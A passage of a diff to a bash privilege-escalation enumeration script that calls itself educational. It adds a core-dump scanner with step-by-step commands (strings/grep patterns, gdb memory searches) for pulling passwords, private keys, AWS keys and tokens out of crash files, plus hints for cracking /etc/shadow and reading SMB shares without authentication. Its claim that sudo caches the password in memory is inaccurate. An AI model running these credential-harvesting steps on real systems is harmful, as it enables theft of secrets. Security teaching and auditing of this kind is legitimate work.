+        find "$location" -maxdepth 2 -type f \( -name "core" -o -name "core.*" -o -name "*.core" \) -readable 2>/dev/null | while read corefile; do
+            # Skip if it's a directory or zero-size
+            [ ! -f "$corefile" ] && continue
+            local size=$(stat -c%s "$corefile" 2>/dev/null)
+            [ "$size" -eq 0 ] && continue
+            
+            echo "$corefile|$size|$location" >> "$temp_core_files"
+            found_issues=1
+        done
+    done
+    
+    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
+    if [ $found_issues -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  CORE DUMPS - Memory Snapshots with Plaintext Secrets"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT ARE CORE DUMPS:"
+        teach "  When a program crashes, Linux can save its entire memory"
+        teach "  to disk as a 'core dump' file. This file contains:"
+        teach "  • All variables (including passwords in plaintext)"
+        teach "  • Command-line arguments"
+        teach "  • Environment variables"
+        teach "  • Network connection data"
+        teach "  • Decrypted keys from memory"
+        teach ""
+        teach "HOW CORE DUMPS HAPPEN:"
+        teach "  1. Program crashes (segfault, abort, etc.)"
+        teach "  2. Kernel captures the entire process memory"
+        teach "  3. Writes memory dump to disk"
+        teach "  4. File location determined by core_pattern"
+        teach "  5. Memory snapshot preserved forever"
+        teach ""
+        teach "WHY THEY CONTAIN SECRETS:"
+        teach ""
+        teach "  Scenario 1 - Database Credentials:"
+        teach "    mysql -u root -p'SecretPass123' database"
+        teach "    MySQL crashes → Core dump created"
+        teach "    Password 'SecretPass123' is in memory → In core file"
+        teach ""
+        teach "  Scenario 2 - SSH Private Keys:"
+        teach "    ssh-agent loads your private key into memory"
+        teach "    ssh-agent crashes → Private key dumped to disk"
+        teach "    Key was encrypted, but now plaintext in core"
+        teach ""
+        teach "  Scenario 3 - Web Application Secrets:"
+        teach "    Apache/Nginx worker processes handle requests"
+        teach "    Request contains: Authorization: Bearer TOKEN123"
+        teach "    Worker crashes → TOKEN123 in core dump"
+        teach ""
+        teach "  Scenario 4 - Sudo Password:"
+        teach "    User types password for sudo command"
+        teach "    Password stored in memory (for 15-min cache)"
+        teach "    Program crashes → Password in core dump"
+        teach ""
+        teach "WHY CORE DUMPS ARE DANGEROUS:"
+        teach "  • Passwords stored encrypted in /etc/shadow"
+        teach "  • But core dumps contain PLAINTEXT from memory"
+        teach "  • Files persist forever (until manually deleted)"
+        teach "  • Often world-readable or group-readable"
+        teach "  • Forgotten by admins (out of sight, out of mind)"
+        teach ""
+        teach "CORE DUMP CONFIGURATION:"
+        teach ""
+        teach "  ulimit -c:"
+        teach "    Controls max core dump size"
+        teach "    ulimit -c 0         → Core dumps disabled"
+        teach "    ulimit -c unlimited → Core dumps enabled (any size)"
+        teach "    ulimit -c 1024      → Max 1MB core dumps"
+        teach ""
+        teach "  /proc/sys/kernel/core_pattern:"
+        teach "    Controls WHERE and HOW cores are written"
+        teach "    'core'              → Write to current directory as 'core'"
+        teach "    'core.%p'           → Include PID: core.12345"
+        teach "    '/var/crash/core.%p' → Centralized crash directory"
+        teach "    '|/usr/share/apport/apport' → Pipe to crash handler"
+        teach ""
+        teach "WHY ADMINS ENABLE CORE DUMPS:"
+        teach "  • Debugging production issues"
+        teach "  • Troubleshooting crashes"
+        teach "  • Post-mortem analysis"
+        teach "  • 'We'll disable it later' (narrator: they didn't)"
+        log ""
+    fi
+    
+    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
+    
+    # Report if core dumping is enabled
+    if [ -s "$temp_core_pattern" ]; then
+        if [ $core_enabled -eq 1 ]; then
+            warn "Core dumping is ENABLED - Crashes will save memory to disk"
+            log ""
+            info "Current ulimit: $ulimit_core"
+            
+            if [ -r /proc/sys/kernel/core_pattern ]; then
+                local pattern=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)
+                info "Core pattern: $pattern"
+                
+                # Decode the pattern
+                case "$pattern" in
+                    core)
+                        info "  → Cores written to current directory as 'core'"
+                        ;;
+                    core.*)
+                        info "  → Cores written to current directory with PID/pattern"
+                        ;;
+                    /*)
+                        info "  → Cores written to: $(dirname "$pattern")"
+                        ;;
+                    \|*)
+                        local handler=$(echo "$pattern" | sed 's/^|//' | awk '{print $1}')
+                        info "  → Cores piped to crash handler: $handler"
+                        ;;
+                esac
+            fi
+            
+            log ""
+            teach "IMPLICATIONS:"
+            teach "  Any program crash will create memory dump"
+            teach "  Dumps may contain plaintext passwords and keys"
+            teach "  Check for existing dumps that you can read"
+        fi
+    fi
+    
+    # Report readable crash dumps in /var/crash
+    if [ -s "$temp_readable_crashes" ]; then
+        critical "READABLE CRASH DUMPS - Memory snapshots with potential credentials"
+        log ""
+        
+        while IFS='|' read -r crash size; do
+            vuln "Readable crash dump: $crash"
+            info "  Size: $(numfmt --to=iec-i --suffix=B $size 2>/dev/null || echo "${size} bytes")"
+        done < "$temp_readable_crashes"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  /var/crash EXPLOITATION"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT IS /var/crash:"
+        teach "  Ubuntu/Debian systems use 'apport' to collect crash reports."
+        teach "  When programs crash, apport saves:"
+        teach "  • Core dump (memory snapshot)"
+        teach "  • Stack trace"
+        teach "  • System information"
+        teach "  • Open files list"
+        teach ""
+        teach "FILE FORMATS:"
+        teach "  .crash files → Compressed crash reports (apport format)"
+        teach "  .core files  → Raw core dumps"
+        teach "  .uploaded    → Marker that crash was sent to Ubuntu"
+        teach ""
+        teach "EXPLOITATION:"
+        teach ""
+        teach "  Step 1 - List crash dumps:"
+        teach "    ls -lah /var/crash/"
+        teach ""
+        teach "  Step 2 - Check file type:"
+        teach "    file /var/crash/program.crash"
+        teach ""
+        teach "  Step 3 - Extract readable strings:"
+        teach "    strings /var/crash/program.crash | grep -i password"
+        teach "    strings /var/crash/program.crash | grep -i 'api.key'"
+        teach "    strings /var/crash/program.crash | grep -E '^[A-Za-z0-9+/]{20,}={0,2}\$'"
+        teach ""
+        teach "  Step 4 - Search for common patterns:"
+        teach "    # Database credentials"
+        teach "    strings /var/crash/program.crash | grep -E 'mysql://|postgres://|mongodb://'"
+        teach ""
+        teach "    # SSH keys (look for key headers)"
+        teach "    strings /var/crash/program.crash | grep -A 20 'BEGIN.*PRIVATE KEY'"
+        teach ""
+        teach "    # Environment variables"
+        teach "    strings /var/crash/program.crash | grep -E 'PASSWORD=|SECRET=|TOKEN='"
+        teach ""
+        teach "    # URLs with credentials"
+        teach "    strings /var/crash/program.crash | grep -E 'https?://[^:]+:[^@]+@'"
+        teach ""
+        teach "  Step 5 - If .crash file is gzip compressed:"
+        teach "    gunzip -c /var/crash/program.crash > /tmp/dump"
+        teach "    strings /tmp/dump | grep -i password"
+        teach ""
+        teach "  Step 6 - Use apport-unpack (if available):"
+        teach "    mkdir /tmp/crash-extract"
+        teach "    apport-unpack /var/crash/program.crash /tmp/crash-extract"
+        teach "    strings /tmp/crash-extract/CoreDump | grep -i password"
+        teach ""
+        teach "TARGETED SEARCH PATTERNS:"
+        teach ""
+        teach "  MySQL/MariaDB:"
+        teach "    strings crash.file | grep -E 'mysql -u|--password='"
+        teach ""
+        teach "  PostgreSQL:"
+        teach "    strings crash.file | grep -E 'PGPASSWORD=|psql.*password'"
+        teach ""
+        teach "  AWS Credentials:"
+        teach "    strings crash.file | grep -E 'AKIA[0-9A-Z]{16}|aws_secret_access_key'"
+        teach ""
+        teach "  Private Keys:"
+        teach "    strings crash.file | grep -B2 -A20 'BEGIN.*PRIVATE KEY'"
+        teach ""
+        teach "  JWT Tokens:"
+        teach "    strings crash.file | grep -E 'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+'"
+        teach ""
+        teach "  API Keys (generic):"
+        teach "    strings crash.file | grep -iE 'api.key|apikey|api_key' | grep -v '\\[' | head -20"
+        log ""
+    fi
+    
+    # Report core files found in various locations
+    if [ -s "$temp_core_files" ]; then
+        critical "CORE DUMP FILES FOUND - Memory snapshots readable"
+        log ""
+        
+        # Group by location for better readability
+        local prev_location=""
+        while IFS='|' read -r corefile size location; do
+            if [ "$location" != "$prev_location" ]; then
+                log ""
+                info "Location: $location"
+                prev_location="$location"
+            fi
+            vuln "  Core dump: $corefile"
+            info "    Size: $(numfmt --to=iec-i --suffix=B $size 2>/dev/null || echo "${size} bytes")"
+        done < "$temp_core_files"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  CORE FILE EXPLOITATION"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT ARE CORE FILES:"
+        teach "  Raw memory dumps from crashed programs."
+        teach "  Usually named: core, core.1234, program.core"
+        teach ""
+        teach "BASIC ANALYSIS:"
+        teach ""
+        teach "  Step 1 - Identify which program crashed:"
+        teach "    file core"
+        teach "    # Output: core: ELF 64-bit LSB core file, x86-64, from 'apache2'"
+        teach ""
+        teach "  Step 2 - Extract all readable strings:"
+        teach "    strings core > core_strings.txt"
+        teach "    # Creates text file with all printable strings"
+        teach ""
+        teach "  Step 3 - Search for sensitive data:"
+        teach "    grep -i password core_strings.txt"
+        teach "    grep -i secret core_strings.txt"
+        teach "    grep -i api core_strings.txt"
+        teach "    grep -i token core_strings.txt"
+        teach "    grep -i key core_strings.txt"
+        teach ""
+        teach "ADVANCED ANALYSIS WITH GDB:"
+        teach ""
+        teach "  If you have gdb and the binary that crashed:"
+        teach ""
+        teach "  Step 1 - Load core dump in gdb:"
+        teach "    gdb /usr/bin/crashed-program core"
+        teach ""
+        teach "  Step 2 - Examine backtrace (see what was running):"
+        teach "    (gdb) bt"
+        teach "    # Shows call stack at time of crash"
+        teach ""
+        teach "  Step 3 - Examine memory regions:"
+        teach "    (gdb) info proc mappings"
+        teach "    # Shows all memory regions"
+        teach ""
+        teach "  Step 4 - Search memory for strings:"
+        teach "    (gdb) find &__libc_start_main, +999999999, \"password\""
+        teach "    # Searches memory for the word 'password'"
+        teach ""
+        teach "  Step 5 - Dump specific memory regions:"
+        teach "    (gdb) dump memory /tmp/heap.bin 0x7ffff7a00000 0x7ffff7b00000"
+        teach "    # Dumps memory range to file"
+        teach "    strings /tmp/heap.bin | grep -i password"
+        teach ""
+        teach "QUICK WINS - One-Liners:"
+        teach ""
+        teach "  Find all passwords in core:"
+        teach "    strings core | grep -i password | grep -v 'password:' | head -20"
+        teach ""
+        teach "  Find SSH private keys:"
+        teach "    strings core | grep -A 30 'BEGIN.*PRIVATE'"
+        teach ""
+        teach "  Find environment variables:"
+        teach "    strings core | grep '=' | grep -E '^[A-Z_]+=' | head -30"
+        teach ""
+        teach "  Find command line arguments:"
+        teach "    strings core | head -100 | grep '^-'"
+        teach ""
+        teach "  Find URLs with credentials:"
+        teach "    strings core | grep -E '://[^/]*:[^@]*@'"
+        teach ""
+        teach "WHAT TO LOOK FOR:"
+        teach ""
+        teach "  Database credentials:"
+        teach "    • Connection strings: mysql://user:pass@host/db"
+        teach "    • Command args: mysqldump -p'password'"
+        teach "    • Config vars: DB_PASSWORD=secret"
+        teach ""
+        teach "  API tokens:"
+        teach "    • Authorization: Bearer <token>"
+        teach "    • API_KEY=AKIA..."
+        teach "    • X-API-Token: ..."
+        teach ""
+        teach "  SSH keys:"
+        teach "    • -----BEGIN RSA PRIVATE KEY-----"
+        teach "    • -----BEGIN OPENSSH PRIVATE KEY-----"
+        teach ""
+        teach "  Session tokens:"
+        teach "    • PHPSESSID=..."
+        teach "    • JWT tokens (eyJ...)"
+        teach "    • session_id=..."
+        teach ""
+        teach "  Plaintext passwords:"
+        teach "    • From authentication attempts"
+        teach "    • From failed login prompts"
+        teach "    • From application memory"
+        log ""
+    fi
+    
+    # === PHASE 4: CLEAN SUMMARY ===
+    log ""
+    if [ $found_issues -eq 0 ]; then
+        ok "No readable core dumps or crash files detected"
+        log ""
+        teach "CORE DUMP STATUS:"
+        teach "  ✓ No readable crash dumps found"
+        teach "  ✓ No core files found in common locations"
+        log ""
+        
+        if [ $core_enabled -eq 0 ]; then
+            ok "Core dumping appears to be disabled (ulimit -c = 0)"
+        fi
+    else
+        info "Core dump analysis complete"
+        log ""
+        teach "═══════════════════════════════════════════════════════════"
+        teach "CORE DUMP EXPLOITATION SUMMARY"
+        teach "═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "ANALYSIS WORKFLOW:"
+        teach "  1. Find core/crash files (already done above)"
+        teach "  2. Use 'file' command to identify format"
+        teach "  3. Extract strings: strings corefile > output.txt"
+        teach "  4. Search for patterns: grep -i password output.txt"
+        teach "  5. Examine with gdb if binary available"
+        teach ""
+        teach "HIGH-VALUE TARGETS IN MEMORY:"
+        teach "  • Database passwords (often plaintext in connections)"
+        teach "  • API keys and tokens (from HTTP requests/responses)"
+        teach "  • SSH private keys (from ssh-agent or active connections)"
+        teach "  • Session cookies (from web applications)"
+        teach "  • Environment variables (often contain secrets)"
+        teach "  • Command-line arguments (passwords passed as args)"
+        teach ""
+        teach "WHY THIS WORKS:"
+        teach "  Encryption protects data AT REST (on disk)"
+        teach "  But data must be DECRYPTED in memory to be used"
+        teach "  Core dumps capture memory = capture decrypted secrets"
+        teach ""
+        teach "REAL-WORLD EXAMPLES:"
+        teach "  • Sudo cached password in memory → Core dump → Plaintext"
+        teach "  • MySQL -p'pass' crashed → Core dump → Password visible"
+        teach "  • Apache SSL key in memory → Core dump → Private key exposed"
+        teach "  • SSH-agent key in memory → Core dump → Key extracted"
+        teach ""
+        teach "DEFENSIVE RECOMMENDATIONS (for admins):"
+        teach "  • Disable core dumps: ulimit -c 0 in /etc/security/limits.conf"
+        teach "  • Restrict crash directory: chmod 700 /var/crash"
+        teach "  • Clear old dumps: rm -rf /var/crash/*"
+        teach "  • Use encrypted core dumps (systemd-coredump)"
+        teach "  • Review core_pattern permissions"
+    fi
+}
 # === PASSWORD & HASH HUNTING ===
 enum_passwords() {
     section "PASSWORD & CREDENTIAL HUNTING"
@@ -8060,7 +9187,7 @@ enum_interesting_files() {
     
     # Report unusual SUID binaries
     if [ -s "$temp_suid_unusual" ]; then
-        critical "UNUSUAL SUID/SGID BINARIES - Custom binaries with root privileges"
+        critical "${WORK}[REQUIRES INVESTIGATION]${RST}UNUSUAL SUID/SGID BINARIES - Custom binaries with root privileges"
         log ""
         
         while IFS= read -r suid_file; do
@@ -8136,7 +9263,7 @@ enum_interesting_files() {
     
     # Report credential files
     if [ -s "$temp_cred_files" ]; then
-        critical "CREDENTIAL FILES READABLE - SSH keys, secrets, password files"
+        warn "CREDENTIAL FILES READABLE - SSH keys, secrets, password files"
         log ""
         
         while IFS= read -r cred_file; do
@@ -8158,7 +9285,7 @@ enum_interesting_files() {
                     teach "  Crack with: john $cred_file"
                     ;;
                 *.pgpass|.my.cnf)
-                    critical "  Database credential file"
+                    critical " ${WORK}[INTERESTING]${RST} Database credential file"
                     teach "  Contains plaintext database passwords"
                     ;;
                 .netrc)
@@ -8205,12 +9332,12 @@ enum_interesting_files() {
             
             case "$config" in
                 */shadow)
-                    critical "  /etc/shadow is READABLE - password hashes exposed!"
+                    critical "${WORK}[REQUIRES CRACKING]${RST}  /etc/shadow is READABLE - password hashes exposed!"
                     teach "  Extract hashes: grep -v '^[^:]*:[*!]:' /etc/shadow"
                     teach "  Crack with john: john --wordlist=rockyou.txt shadow"
                     ;;
                 */sudoers)
-                    critical "  /etc/sudoers is READABLE - sudo rules exposed"
+                    critical "${WORK}[REQUIRES INVESTIGATION]${RST}  /etc/sudoers is READABLE - sudo rules exposed"
                     teach "  Review for NOPASSWD entries and misconfigurations"
                     ;;
                 *sshd_config)
@@ -8222,7 +9349,7 @@ enum_interesting_files() {
                     teach "  grep -E 'password|user' $config"
                     ;;
                 *.aws/credentials)
-                    critical "  AWS credentials readable - cloud access!"
+                    warn "  AWS credentials readable - cloud access!"
                     teach "  Use with: aws configure --profile default"
                     ;;
                 *.docker/config.json)
@@ -8341,13 +9468,13 @@ enum_smb() {
             local smb_shares=$(smbclient -N -L //127.0.0.1 2>/dev/null | grep "Disk" | awk '{print $1}')
             
             if [ -n "$smb_shares" ]; then
-                critical "SMB shares accessible with null session"
+                warn "${WORK}[INTERESTING]${RST} SMB shares accessible with null session"
                 echo "$smb_shares" | while read share; do
                     log "  Share: $share"
                     
                     # Try to access the share
                     if smbclient -N "//127.0.0.1/$share" -c "ls" 2>/dev/null | grep -q "."; then
-                        critical "Share $share is READABLE without authentication"
+                        warn "${WORK}[INTERESTING]${RST} Share $share is READABLE without authentication"
                         teach "Access with: smbclient -N //127.0.0.1/$share"
                     fi
                 done
@@ -8662,7 +9789,6 @@ enum_tools() {
     }
     trap cleanup_tool_temps RETURN
     
-    # Define tools by exploitation category (only critical ones)
     # Compilers - needed to build kernel exploits, C exploits
     local compilers=("gcc" "g++" "cc" "clang" "make")
     
@@ -9898,7 +11024,7 @@ EOF
     echo -e "\033[32mMMMMMMMMMMMM\033[0m                                     \033[34mMMMMMMMMMMMM\033[0m                            "
     cat << "EOF"
     
-              Educational Privilege Escalation Tool - Version 1.8.0
+              Educational Privilege Escalation Tool - Version 1.7.0
                               Made by Wiz-Works
     ════════════════════════════════════════════════════════════════
 
@@ -9936,6 +11062,7 @@ EOF
     enum_sudo
     enum_sudo2
     enum_sudo_version
+    enum_sudo_tokens
     enum_suid
     enum_sgid
     enum_writable_files
@@ -9946,6 +11073,7 @@ EOF
     enum_groups
     
     # Service-based vectors
+    enum_boot_scripts
     enum_cron
     enum_systemd
     
@@ -9972,6 +11100,7 @@ EOF
     
     # Credential hunting
     enum_passwords
+    enum_core_dumps
     enum_software_versions
     enum_interesting_files
     enum_hidden_files
